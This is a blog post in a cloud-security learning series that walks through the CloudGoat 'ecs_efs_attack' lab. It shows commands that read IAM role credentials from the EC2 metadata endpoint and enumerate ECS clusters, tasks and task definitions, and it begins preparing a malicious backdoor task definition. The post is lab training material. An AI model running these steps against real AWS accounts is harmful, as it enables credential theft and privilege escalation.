---
title: '100 Days of Cloud Security - Day 27: Attack — `ecs_efs_attack` - Part 1'
date: '2025-12-06'
author: 'Venkata Pathuri'
excerpt: 'Day 27 of my cloud security journey - Attack — `ecs_efs_attack` - Part 1'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 27: Attack — `ecs_efs_attack` - Part 1

## Overview
Welcome to Day 27 of our cloud security journey! Today, we dive into the fascinating world of container security through the `ecs_efs_attack` scenario. Building on the foundations we've laid in previous days, we will explore how misconfigured IAM roles and task definitions can lead to privilege escalation and unauthorized access to sensitive data in Amazon Elastic File System (EFS). This hands-on exercise not only enhances your understanding of AWS security mechanisms but also equips you with the skills to identify and exploit vulnerabilities.

## Learning Objectives
By the end of this session, you will master the techniques for deploying the `ecs_efs_attack` scenario, retrieving EC2 instance role credentials, and enumerating ECS resources. You'll learn to extract task definitions and create a malicious task definition that could potentially lead to unauthorized access to EFS data. This practical experience will deepen your understanding of AWS IAM, ECS, and EFS while highlighting the importance of proper configuration and security practices.

## Deep Dive
### Understanding the Scenario
In this exercise, we have a setup consisting of a VPC with various AWS resources, including EC2 instances, an ECS cluster, and an EFS. The goal is to exploit misconfigurations to gain unauthorized access to EFS data. This scenario reflects real-world attacks where misconfigured permissions can lead to data breaches.

#### Key Concepts
1. **EC2 Instance**: A virtual server in Amazon's Elastic Compute Cloud (EC2) where we first gain access.
2. **ECS (Elastic Container Service)**: A fully managed container orchestration service that allows you to run and scale containerized applications.
3. **EFS (Elastic File System)**: A scalable file storage service for use with AWS Cloud services and on-premises resources.

#### Real-World Example
Consider a company that has deployed its applications using ECS. If they misconfigure IAM roles, attackers could exploit this vulnerability, gaining access to sensitive data stored in EFS. Understanding these vulnerabilities allows organizations to better secure their environments.

### Step-by-Step Breakdown
1. **Initial Access - EC2 Instance**: 
   To start, SSH into the EC2 instance using the provided command:
   ```bash
   ssh -i cloudgoat ubuntu@3.236.158.227
   ```
   Once inside, you can access instance metadata to retrieve IAM role credentials.

2. **Retrieve EC2 Instance Role Credentials**: 
   Use the following command to access the security credentials of the instance role:
   ```bash
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidhosp5cuypf
   ```
   This will provide you with temporary security credentials that allow you to interact with other AWS services.

3. **Verify AWS Credentials**: 
   To confirm that you have successfully assumed the role, run:
   ```bash
   aws sts get-caller-identity --profile cg
   ```
   You should see output confirming your identity and the role you have assumed, indicating you have the necessary permissions.

4. **Enumerate ECS Resources**: 
   Start by listing ECS clusters:
   ```bash
   aws ecs list-clusters --profile cg
   ```
   Next, list the services within the cluster:
   ```bash
   aws ecs list-services --cluster cg-cluster-cgidhosp5cuypf --profile cg
   ```
   And finally, list running tasks:
   ```bash
   aws ecs list-tasks --cluster cg-cluster-cgidhosp5cuypf --service-name cg-webapp-cgidhosp5cuypf --profile cg
   ```

5. **Describe Task Details and Extract Task Definition**: 
   Use the task ARN obtained from the previous step to describe the task and extract the task definition:
   ```bash
   aws ecs describe-tasks --cluster cg-cluster-cgidhosp5cuypf --tasks 2897bc4c0ca040f3bddb17f02fd97c37 --profile cg
   ```
   Then, extract the task definition:
   ```bash
   aws ecs describe-task-definition --task-definition webapp:1 --profile cg > webapp.json
   ```

### Creating a Malicious Task Definition
To escalate privileges further, you can create a new task definition that could, for example, run a backdoor container. Start by generating a template:
```bash
aws ecs register-task-definition --generate-cli-skeleton --profile cg > newtask_template.json
```
Modify the JSON file to include your malicious configuration.

## Hands-On Practice
Follow the above commands step-by-step to gain practical experience. Ensure you replace any placeholder credentials with your actual credentials, marked clearly as examples to avoid confusion:
- AWS Access Key ID: `AKIAIOSFODNN7EXAMPLE  # Example credential - replace with yours` 
- Secret Access Key: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`

### Expected Outcomes
By the end of these actions, you should successfully enumerate ECS resources and prepare to create a malicious task definition that utilizes the service role from the original task definition.

## Key Takeaways
Understanding how to exploit misconfigured IAM roles and task definitions is crucial in today's cloud environment. This exercise not only highlights vulnerabilities within AWS services but also stresses the importance of proper configuration and regular security assessments to prevent unauthorized access to sensitive data.

## Real-World Applications
In production environments, the lessons learned from this exercise are invaluable. Organizations must regularly audit their IAM roles and ECS configurations to ensure that no unintended permissions allow for privilege escalation. Real-world attacks often stem from these misconfigurations, making it essential for cloud security practitioners to stay vigilant and proactive.

---
**Journey Progress:** 27/100 Days Complete 🚀